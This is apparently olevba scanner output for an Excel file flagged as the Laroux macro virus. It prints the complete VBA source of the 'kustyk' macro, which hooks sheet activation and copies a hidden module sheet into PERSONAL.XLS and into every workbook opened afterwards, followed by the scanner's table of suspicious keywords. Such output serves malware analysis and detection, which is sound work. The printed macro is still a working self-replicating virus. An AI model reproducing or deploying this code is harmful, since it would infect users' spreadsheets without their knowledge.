olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux.kw-fb16e4ae972fec67c89cb571e10a4d6175a3eff1
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO kustyk.bas 
in file: Virus.MSExcel.Laroux.kw-fb16e4ae972fec67c89cb571e10a4d6175a3eff1 - OLE stream: '_VBA_PROJECT_CUR/VBA/kustyk'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Dim OldMacro$

Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.OnSheetActivate = "check_kustyk"
End Sub

Sub check_kustyk()
Attribute check_kustyk.VB_ProcData.VB_Invoke_Func = " \n14"
    Dim WhichFile
    Dim Dopisal As Boolean
    
    c4$ = CurDir()

    c$ = Application.StartupPath
    mp$ = c$ & "\" & "PERSONAL.XLS"
    m$ = Dir(mp$)
    Application.ScreenUpdating = False
    
    WhichFile = 0
    If m$ <> "PERSONAL.XLS" Then
        WhichFile = 1
    Else
        WhichFile = 2
        If Workbooks("PERSONAL.XLS").Modules.Count > 0 Then
            For i = 1 To Workbooks("PERSONAL.XLS").Modules.Count
                If Workbooks("PERSONAL.XLS").Modules(i).Name = "kustyk" Then
                    WhichFile = WhichFile + 1
                    Exit For
                End If
            Next
        End If
        If WhichFile > 2 Then
            If ActiveWorkbook.Modules.Count > 0 Then
                For i = 1 To ActiveWorkbook.Modules.Count
                    If ActiveWorkbook.Modules(i).Name = "kustyk" Then
                        WhichFile = WhichFile + 1
                        Exit For
                    End If
                Next
            End If
        End If
    End If
    ChDir c4$
    
    Select Case WhichFile
    Case 1
        On Error GoTo Blad_Zapisu1
        n4$ = ActiveWorkbook.Name
        Sheets("kustyk").Visible = True
        Sheets("kustyk").Select
        Sheets("kustyk").Copy
        With ActiveWorkbook
            .Title = ""
            .Subject = ""
            .Author = ""
            .Keywords = ""
            .Comments = ""
        End With
        newname$ = ActiveWorkbook.Name
        Modules.Add
        Sheets("kustyk").Visible = False
        c4$ = CurDir()
        ChDir Application.StartupPath
        ActiveWindow.Visible = False
        Workbooks(newname$).SaveAs FileName:=Application.StartupPath & "/" & "PERSONAL.XLS", FileFormat:=xlNormal _
            , Password:="", WriteResPassword:="", ReadOnlyRecommended:= _
            False, CreateBackup:=False
        Application.OnSheetActivate = "personal.xls!check_kustyk"
        GoTo Pracuj_Dalej1
Blad_Zapisu1:
        Application.OnSheetActivate = ""
Pracuj_Dalej1:
        On Error GoTo 0
        ChDir c4$
        Windows(n4$).Visible = True
        Workbooks(n4$).Sheets("kustyk").Visible = False
    
    
    Case 2
        n4$ = ActiveWorkbook.Name
        On Error GoTo Blad_Zapisu2
        Sheets("kustyk").Visible = True
        Sheets("kustyk").Select
        Windows("PERSONAL.XLS").Visible = True
        Workbooks(n4$).Sheets("kustyk").Copy before:=Workbooks("PERSONAL.XLS").Sheets(1)
        Workbooks("PERSONAL.XLS").Sheets("kustyk").Visible = False
        Windows("PERSONAL.XLS").Visible = False
        Workbooks("PERSONAL.XLS").Save
        Application.OnSheetActivate = "personal.xls!check_kustyk"
        GoTo Pracuj_Dalej2
Blad_Zapisu2:
        Windows("PERSONAL.XLS").Visible = False
        Application.OnSheetActivate = ""
Pracuj_Dalej2:
        On Error GoTo 0
        Workbooks("PERSONAL.XLS").Saved = True
        Sheets("kustyk").Visible = False
    
    
    Case 3
        n4$ = ActiveWorkbook.Name
        p4$ = ActiveWorkbook.Path
        s$ = Workbooks(n4$).Sheets(1).Name
        If s$ <> "kustyk" Then
            Workbooks("PERSONAL.XLS").Sheets("kustyk").Visible = True
            Workbooks("PERSONAL.XLS").Sheets("kustyk").Copy before:=Workbooks(n4$).Sheets(1)
            Workbooks("PERSONAL.XLS").Sheets("kustyk").Visible = False
            Workbooks(n4$).Sheets("kustyk").Visible = False
            Workbooks("PERSONAL.XLS").Save
        End If
        Application.OnSheetActivate = ""
        Application.OnSheetActivate = "personal.xls!check_kustyk"
    Case Else
    End Select
    Application.ScreenUpdating = True
End Sub

-------------------------------------------------------------------------------
VBA MACRO ЭтаКнига.cls 
in file: Virus.MSExcel.Laroux.kw-fb16e4ae972fec67c89cb571e10a4d6175a3eff1 - OLE stream: '_VBA_PROJECT_CUR/VBA/ЭтаКнига'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  kusty
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

